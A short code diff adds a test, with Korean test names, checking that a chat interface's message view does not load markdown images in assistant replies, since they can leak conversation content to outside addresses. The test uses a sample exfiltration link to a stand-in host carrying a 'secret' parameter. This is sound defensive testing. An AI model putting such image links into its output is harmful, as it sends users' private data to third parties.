@@ -56,4 +56,10 @@ describe("마크다운 서식", () => {
     expect(container.querySelector("li")?.textContent).toBe("3년 주기");
     expect(container.textContent).not.toContain("|---|");
   });
+  it("마크다운 이미지는 불러오지 않는다(외부 주소로 대화 내용이 새는 경로) — 대체 글만", () => {
+    const { container } = render(<MessageView message={{ id: "m1", role: "assistant", text: "요약 ![로고](https://evil.test/p?d=secret) 끝", attachments: [], tools: [], status: "ok", masked: 0 }} />);
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.innerHTML).not.toContain("evil.test");
+    expect(container.textContent).toContain("[이미지: 로고]");
+  });
 });
